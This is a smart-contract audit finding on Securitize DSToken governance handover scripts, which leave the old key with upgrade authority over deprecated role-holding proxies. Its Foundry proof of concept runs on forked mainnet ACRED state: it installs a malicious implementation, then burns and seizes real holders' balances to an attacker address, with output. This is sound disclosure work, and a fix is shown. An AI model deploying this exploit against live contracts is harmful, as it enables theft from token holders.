---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2026-09-07-cyfrin-securitize-evm-dstoken-timelocks-v2-0-1-0
ingested_at: '2026-10-04T10:45:09Z'
protocol_category: []
published_at: '2026-09-07T00:00:00Z'
related_swc: []
severity: Informational
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-09-07-cyfrin-securitize-evm-dstoken-timelocks-v2.0.md
tags:
- firm:cyfrin
- report:2026-09-07-cyfrin-securitize-evm-dstoken-timelocks-v2-0
title: '`setup-governance` handover omits deprecated service ids so pre-handover key
  retains `OwnableUpgradeable::owner` upgrade authority over live `ROLE_ISSUER` and
  `ROLE_TRANSFER_AGENT` proxies and can burn, seize holder balances with no delay'
vuln_class: []
---

# `setup-governance` handover omits deprecated service ids so pre-handover key retains `OwnableUpgradeable::owner` upgrade authority over live `ROLE_ISSUER` and `ROLE_TRANSFER_AGENT` proxies and can burn, seize holder balances with no delay

_Section severity (from Solodit section header): Informational_  
_Audit firm: Cyfrin_  
_Source report: [2026-09-07-cyfrin-securitize-evm-dstoken-timelocks-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-09-07-cyfrin-securitize-evm-dstoken-timelocks-v2.0.md)_

---

**Description:** `ServiceConsumer::onlyMaster` authorizes two independent principals: the contract's own `OwnableUpgradeable::owner`, or the address holding `ROLE_MASTER` in `TrustService`.

```solidity
modifier onlyMaster {
    if (owner() != msg.sender) require(getTrustService().getRole(msg.sender) == ROLE_MASTER, "Insufficient trust level");
    _;
}
```

`BaseDSContract::_authorizeUpgrade` is gated on that modifier, so `owner` alone is sufficient to replace the implementation behind any `BaseDSContract` proxy. A complete governance handover therefore has to move both principals for every privileged contract, not just the role.

The `setup-governance` task moves `owner` only for the ten service ids listed in its `OWNED_SERVICE_IDS` map, plus the token itself. That map omits `DEPRECATED_OMNIBUS_TBE_CONTROLLER` at id 2048, `DEPRECATED_TOKEN_REALLOCATOR` at id 8192 and `DEPRECATED_SECURITIZE_SWAP` at id 16384. The `DEPRECATED_` prefix is a source-code label with no on-chain effect: these ids are still registered on live tokens and the contracts behind them still hold `ROLE_ISSUER` and `ROLE_TRANSFER_AGENT`. The `verify-governance` task iterates the same map, so the residual owners fall outside what it is able to report.

On Ethereum mainnet at block 25845400, six of the eight live ERC1967 `DSToken` proxies register at least one omitted id, and in every case the contract behind it is owned by that token's `ROLE_MASTER` holder:

| Token | Omitted ids registered | Roles held | Owner is the `ROLE_MASTER` holder |
|---|---|---|---|
| BUIDL-I | 2048, 8192 | `ROLE_ISSUER`, `ROLE_TRANSFER_AGENT` | yes |
| VBILL | 2048, 8192, 16384 | `ROLE_ISSUER`, `ROLE_TRANSFER_AGENT`, `ROLE_ISSUER` | yes |
| ACRED | 2048, 8192, 16384 | `ROLE_ISSUER`, `ROLE_TRANSFER_AGENT`, `ROLE_ISSUER` | yes |
| PFII | 2048, 8192 | `ROLE_ISSUER`, `ROLE_TRANSFER_AGENT` | yes |
| HLSCOPE | 2048, 8192, 16384 | `ROLE_ISSUER`, `ROLE_TRANSFER_AGENT`, `ROLE_ISSUER` | yes |
| USDCIHF | 2048, 8192, 16384 | `ROLE_ISSUER`, `ROLE_TRANSFER_AGENT`, `ROLE_ISSUER` | yes |

VOLOREB and VOLOREB2 register none of the omitted ids and are unaffected.

Two details make the gap harder to close by hand. `DEPRECATED_SECURITIZE_SWAP` gates `_authorizeUpgrade` on `owner` alone, reverting with `OwnableUnauthorizedAccount` rather than `Insufficient trust level` for a non-owner caller, so moving `ROLE_MASTER` can never bring it under the timelock and only an ownership transfer can. Separately, `WALLET_REGISTRAR` at id 1024 is present in `OWNED_SERVICE_IDS`, but where its `owner` is not the signer the task logs a skip and continues rather than failing; on ACRED that contract holds `ROLE_ISSUER`.

**Impact:** The stated goal of these changes per timelocks.pdf is to prevent the following risk:

> The risk being addressed is that a single compromised key, or a single operational mistake, can mint supply or reroute the token's core services and extract value before anyone can intervene.

Two thirds of that holds:
* the allowance cannot be sidestepped by choosing another mint entry point, because `DSToken::issueTokensWithMultipleLocks` is the only issuance path and `DSToken::_checkThrottle` is unconditional on it, so an attacker who takes over an `ROLE_ISSUER` proxy is throttled at that entry point like any other caller. Supply creation as a whole is not bounded by the allowance: the `SecuritizeRebasingProvider::setMultiplier` finding covers a separate path reachable from the same role
* service re-pointing is bounded because `ServiceConsumer::setDSService` is gated on the token's own `owner`, which the handover does transfer

Value extraction is not bounded as:
* `DSToken::burn` accepts an arbitrary holder and is authorized for `ROLE_ISSUER`
* `DSToken::seize` moves an arbitrary holder's balance and is authorized for `ROLE_TRANSFER_AGENT`

Neither consumes the mint allowance and neither passes through any timelock. Both are reachable through proxies the handover never touches, and `verify-governance` iterates the same map so it never reports on them either, so after `setup-governance --handover` has completed the pre-handover key still destroys and takes holder balances in a single transaction, with no delay in which a canceller could act.

**Proof of Concept:** The proof below runs against live ACRED state. It burns one holder's entire balance of 45.729764 ACRED and seizes another holder's entire balance of 230.259591 ACRED to an attacker address, reducing total supply from 25971.059372 to 25925.329608. Nothing bounds the attack to those two holders: the same two calls apply to every wallet the token enumerates, so the ceiling is the full circulating supply of each affected token.

`seize` has one precondition, that the destination is a registered issuer wallet. `WalletManager::addIssuerWallet` is authorized for `ROLE_ISSUER`, so the second hijacked proxy satisfies it, which the proof also demonstrates.

Add the following test to `test/securitize-io-pocs/test/HandoverResidualAuthority.t.sol` and run with `ETH_RPC_URL=<ethereum mainnet rpc> forge test --match-test test_HandoverLeavesInstantValueExtractionPath -vv`:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.22;

import {Test, console} from "forge-std/Test.sol";

interface IDSToken {
    function getDSService(uint256 serviceId) external view returns (address);
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
    function balanceOf(address who) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function walletCount() external view returns (uint256);
    function getWalletAt(uint256 index) external view returns (address);
    function burn(address who, uint256 value, string calldata reason) external;
    function seize(address from, address to, uint256 value, string calldata reason) external;
}

interface ITrustService {
    function getRole(address who) external view returns (uint8);
    function setServiceOwner(address newOwner) external returns (bool);
}

interface IWalletManager {
    function addIssuerWallet(address wallet) external returns (bool);
    function isIssuerSpecialWallet(address wallet) external view returns (bool);
}

interface IUUPS {
    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable;
    function getImplementationAddress() external view returns (address);
}

/// @notice Minimal UUPS-compatible implementation with an arbitrary-call entry point;
///         declares no storage, so installing it cannot corrupt the proxy it is
///         installed behind. `proxiableUUID` satisfies the ERC1822 check that the
///         outgoing implementation performs during `upgradeToAndCall`
contract MaliciousImplementation {
    bytes32 private constant _IMPL_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function proxiableUUID() external pure returns (bytes32) {
        return _IMPL_SLOT;
    }

    /// @notice Executes an arbitrary call; `msg.sender` seen by the target is this
    ///         proxy's address, which is the address holding the role
    function exec(address target, bytes calldata data) external returns (bytes memory) {
        (bool ok, bytes memory ret) = target.call(data);
        require(ok, "exec failed");
        return ret;
    }
}

contract HandoverResidualAuthorityTest is Test {
    uint256 constant FORK_BLOCK = 25_845_400;

    // ACRED deployment, Ethereum mainnet
    IDSToken constant TOKEN = IDSToken(0x17418038ecF73BA4026c4f428547BF099706F27B);
    ITrustService constant TRUST = ITrustService(0xc397436742eAF7C325DDBFc4dc63D95822b27101);
    IWalletManager constant WALLET_MANAGER = IWalletManager(0x5275732D1bFE540350165267346537670Bc2138a);

    // Pre-handover key: holds ROLE_MASTER and is owner() of the token and most services
    address constant MASTER_EOA = 0x59c1eAcEc450c57Dcb9b8725d0F96635C2b676Ee;

    // Registered under service ids the handover task never enumerates
    address constant DEPRECATED_TOKEN_REALLOCATOR = 0x7b021A22fe5a6CaEFD81623fF8fbE7e97B0e61eE; // id 8192
    address constant DEPRECATED_OMNIBUS_TBE = 0xDCC82829b3eb1d497D2FF982c76EaeC44435a4E9; // id 2048

    uint8 constant ROLE_NONE = 0;
    uint8 constant ROLE_MASTER = 1;
    uint8 constant ROLE_ISSUER = 2;
    uint8 constant ROLE_TRANSFER_AGENT = 8;

    /// @dev The exact list from OWNED_SERVICE_IDS in the handover task
    uint256[10] OWNED_SERVICE_IDS = [
        uint256(4), // REGISTRY_SERVICE
        8, // COMPLIANCE_SERVICE
        32, // WALLET_MANAGER
        64, // LOCK_MANAGER
        256, // COMPLIANCE_CONFIGURATION_SERVICE
        512, // TOKEN_ISSUER
        1024, // WALLET_REGISTRAR
        4096, // TRANSACTION_RELAYER
        8196, // REBASING_PROVIDER
        8197 // BLACKLIST_MANAGER
    ];

    address masterTimelock = makeAddr("masterTimelock");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), FORK_BLOCK);
    }

    function test_HandoverLeavesInstantValueExtractionPath() public {
        // ---------------------------------------------------------------
        // Step 1: the pre-handover key is the MASTER holder, the token owner,
        //         and an EOA rather than the documented operational multisig
        // ---------------------------------------------------------------
        assertEq(TRUST.getRole(MASTER_EOA), ROLE_MASTER, "step 1: expected MASTER role");
        assertEq(TOKEN.owner(), MASTER_EOA, "step 1: expected token owner");
        assertEq(MASTER_EOA.code.length, 0, "step 1: expected an EOA");

        // ---------------------------------------------------------------
        // Step 2: the omitted service ids are live and hold privileged roles
        // ---------------------------------------------------------------
        assertEq(TOKEN.getDSService(8192), DEPRECATED_TOKEN_REALLOCATOR, "step 2: id 8192");
        assertEq(TOKEN.getDSService(2048), DEPRECATED_OMNIBUS_TBE, "step 2: id 2048");
        assertEq(TRUST.getRole(DEPRECATED_TOKEN_REALLOCATOR), ROLE_TRANSFER_AGENT, "step 2: 8192 role");
        assertEq(TRUST.getRole(DEPRECATED_OMNIBUS_TBE), ROLE_ISSUER, "step 2: 2048 role");

        // ---------------------------------------------------------------
        // Step 3: both are owned by the key that is about to hand over
        // ---------------------------------------------------------------
        assertEq(IDSToken(DEPRECATED_TOKEN_REALLOCATOR).owner(), MASTER_EOA, "step 3: 8192 owner");
        assertEq(IDSToken(DEPRECATED_OMNIBUS_TBE).owner(), MASTER_EOA, "step 3: 2048 owner");

        // ---------------------------------------------------------------
        // Step 4: perform the documented handover exactly as the task does:
        //         transfer owner() for every id in OWNED_SERVICE_IDS plus the
        //         token, then move the MASTER role. Ids 2048, 8192 and 16384
        //         are absent from that list, so they are never visited
        // ---------------------------------------------------------------
        vm.startPrank(MASTER_EOA);
        TOKEN.transferOwnership(masterTimelock);
        for (uint256 i = 0; i < OWNED_SERVICE_IDS.length; i++) {
            address service = TOKEN.getDSService(OWNED_SERVICE_IDS[i]);
            if (service == address(0)) continue;
            // the task skips any contract whose owner is not the signer
            if (IDSToken(service).owner() != MASTER_EOA) continue;
            IDSToken(service).transferOwnership(masterTimelock);
        }
        TRUST.setServiceOwner(masterTimelock);
        vm.stopPrank();

        // ---------------------------------------------------------------
        // Step 5: handover is complete by every check the tasks perform.
        //         The old key no longer holds MASTER anywhere
        // ---------------------------------------------------------------
        assertEq(TRUST.getRole(MASTER_EOA), ROLE_NONE, "step 5: MASTER not surrendered");
        assertEq(TRUST.getRole(masterTimelock), ROLE_MASTER, "step 5: timelock is not MASTER");
        assertEq(TOKEN.owner(), masterTimelock, "step 5: token owner not moved");

        // ... but the omitted proxies are still owned by the old key
        address residualOwner8192 = IDSToken(DEPRECATED_TOKEN_REALLOCATOR).owner();
        address residualOwner2048 = IDSToken(DEPRECATED_OMNIBUS_TBE).owner();
        assertEq(residualOwner8192, MASTER_EOA, "step 5: 8192 residual owner");
        assertEq(residualOwner2048, MASTER_EOA, "step 5: 2048 residual owner");

        // ---------------------------------------------------------------
        // Step 6: post-handover, the old key replaces the implementation
        //         behind both role-bearing proxies. `onlyMaster` accepts
        //         owner() as an alternative to the MASTER role, so this is
        //         authorized even though the key is no longer MASTER
        // ---------------------------------------------------------------
        MaliciousImplementation evil = new MaliciousImplementation();

        vm.startPrank(MASTER_EOA);
        IUUPS(DEPRECATED_TOKEN_REALLOCATOR).upgradeToAndCall(address(evil), "");
        IUUPS(DEPRECATED_OMNIBUS_TBE).upgradeToAndCall(address(evil), "");
        vm.stopPrank();

        // the role lives on the proxy address, which never changed
        assertEq(TRUST.getRole(DEPRECATED_TOKEN_REALLOCATOR), ROLE_TRANSFER_AGENT, "step 6: TA role lost");
        assertEq(TRUST.getRole(DEPRECATED_OMNIBUS_TBE), ROLE_ISSUER, "step 6: ISSUER role lost");

        // ---------------------------------------------------------------
        // Step 7: use the hijacked identities against the live token.
        //         Neither burn nor seize consumes the mint allowance and
        //         neither passes through any timelock
        // ---------------------------------------------------------------
        address victimBurn = _holderWithBalance(0);
        address victimSeize = _holderWithBalance(1);
        uint256 burnAmount = TOKEN.balanceOf(victimBurn);
        uint256 seizeAmount = TOKEN.balanceOf(victimSeize);
        uint256 supplyBefore = TOKEN.totalSupply();

        // 7a: destroy a holder's entire balance through the hijacked ISSUER
        MaliciousImplementation(DEPRECATED_OMNIBUS_TBE).exec(
            address(TOKEN), abi.encodeCall(IDSToken.burn, (victimBurn, burnAmount, "poc"))
        );

        // 7b: register the attacker as an issuer wallet, the sole precondition
        //     `validateSeize` enforces, using the same hijacked ISSUER
        MaliciousImplementation(DEPRECATED_OMNIBUS_TBE).exec(
            address(WALLET_MANAGER), abi.encodeCall(IWalletManager.addIssuerWallet, (attacker))
        );
        assertTrue(WALLET_MANAGER.isIssuerSpecialWallet(attacker), "step 7b: attacker not registered");

        // 7c: seize another holder's balance to the attacker through the
        //     hijacked TRANSFER_AGENT
        MaliciousImplementation(DEPRECATED_TOKEN_REALLOCATOR).exec(
            address(TOKEN), abi.encodeCall(IDSToken.seize, (victimSeize, attacker, seizeAmount, "poc"))
        );

        // ---------------------------------------------------------------
        // Step 8: value moved, with no delay and no cancellation window
        // ---------------------------------------------------------------
        assertEq(TOKEN.balanceOf(victimBurn), 0, "step 8: burn victim retains balance");
        assertEq(TOKEN.totalSupply(), supplyBefore - burnAmount, "step 8: supply unchanged");
        assertEq(TOKEN.balanceOf(victimSeize), 0, "step 8: seize victim retains balance");
        assertEq(TOKEN.balanceOf(attacker), seizeAmount, "step 8: attacker did not receive balance");

        assertGt(burnAmount, 0, "step 8: burn victim had no balance");
        assertGt(seizeAmount, 0, "step 8: seize victim had no balance");

        console.log("handover completed, old key MASTER role :", TRUST.getRole(MASTER_EOA));
        console.log("residual owner of id 8192 proxy         :", residualOwner8192);
        console.log("residual owner of id 2048 proxy         :", residualOwner2048);
        console.log("burned from                             :", victimBurn);
        console.log("burned amount                           :", burnAmount);
        console.log("seized from                             :", victimSeize);
        console.log("seized amount to attacker               :", seizeAmount);
        console.log("total supply before / after             :", supplyBefore, TOKEN.totalSupply());
    }

    /// @dev Returns the nth enumerated wallet holding a non-zero balance,
    ///      skipping the attacker and the hijacked proxies
    function _holderWithBalance(uint256 skip) internal view returns (address) {
        uint256 count = TOKEN.walletCount();
        uint256 seen;
        for (uint256 i = 0; i < count; i++) {
            (bool ok, bytes memory ret) =
                address(TOKEN).staticcall(abi.encodeCall(IDSToken.getWalletAt, (i)));
            if (!ok) continue;
            address wallet = abi.decode(ret, (address));
            if (wallet == address(0) || wallet == attacker) continue;
            if (wallet == DEPRECATED_TOKEN_REALLOCATOR || wallet == DEPRECATED_OMNIBUS_TBE) continue;
            if (TOKEN.balanceOf(wallet) == 0) continue;
            if (seen == skip) return wallet;
            seen++;
        }
        revert("no holder with balance");
    }
}
```

Output:

```
Ran 1 test for test/HandoverResidualAuthority.t.sol:HandoverResidualAuthorityTest
[PASS] test_HandoverLeavesInstantValueExtractionPath() (gas: 697765)
Logs:
  handover completed, old key MASTER role : 0
  residual owner of id 8192 proxy         : 0x59c1eAcEc450c57Dcb9b8725d0F96635C2b676Ee
  residual owner of id 2048 proxy         : 0x59c1eAcEc450c57Dcb9b8725d0F96635C2b676Ee
  burned from                             : 0x74d85d04C158C984Ad114381C413A6ED01BCEa63
  burned amount                           : 45729764
  seized from                             : 0xA088F02Ec0eCB376513F61437012e4995Eb12296
  seized amount to attacker               : 230259591
  total supply before / after             : 25971059372 25925329608
```

**Recommended Mitigation:** The simplest fix is to revoke `ROLE_ISSUER` and `ROLE_TRANSFER_AGENT` from the deprecated contracts on live tokens and clear their service ids. But if those roles are still required for the deprecated contracts, then the fix becomes to transfer ownership of them at the same time to the timelock such that the master EOA does not retain ownership of them.

A more comprehensive systematic fix is to stop deriving the set of contracts to hand over from a hardcoded service-id map, since it cannot see privileged contracts registered under ids not in the map, nor role holders that have no service id at all.

1. Reconstruct the privileged set from `TrustService` state or its role events rather than from `OWNED_SERVICE_IDS`, resolve the `owner` and current implementation of each address returned, and transfer every owner that is still the signer
2. Make a mismatch fatal: where an expected owner is not the signer, revert rather than log a skip and continue, so a partial handover cannot be mistaken for a complete one
3. Extend `verify-governance` to perform the same reconstruction and fail whenever any address holding a role retains an upgrade authority outside the intended timelock, instead of re-reading the same map the setup task used
4. Handle `DEPRECATED_SECURITIZE_SWAP` separately: it gates `_authorizeUpgrade` on `owner` alone rather than through `onlyMaster`, so moving `ROLE_MASTER` grants the master timelock no authority over it, and the timelock cannot take ownership afterwards because `transferOwnership` is itself owner-gated. Transfer its ownership explicitly while the current owner key still exists, or revoke its roles before that key is retired
5. Consider whether any restrictions should apply to `DSToken::burn` and `DSToken::seize` similar to the restrictions that apply to issuance

**Securitize:** Fixed in commit [eadeeab](https://github.com/securitize-io/dstoken/commit/eadeeab517275b746abc65e46f46649a1728da8b) by:
* defining all service IDs including deprecated/legacy in new file `tasks/utils/governed-services.ts`
* improved pre-flight and verification scripts to check/verify every transferable contract and abort before moving ownership if a contract is not owned by the signer
* verification asserts both ownership and that each service resolves the expected `TrustService`
* `WalletRegistrar` now receives only `EXCHANGE`, which is sufficient for `RegistryService::updateInvestor` without granting `burn` authority
* significantly improved documentation to instruct exactly how and when these scripts should be used, and the repo location of another set of scripts used to update existing contracts prior to wiring governance into them

**Cyfrin:** Verified; the scripts are much more robust now and prevent a wide range of bad post-execution scenarios that were previously possible.
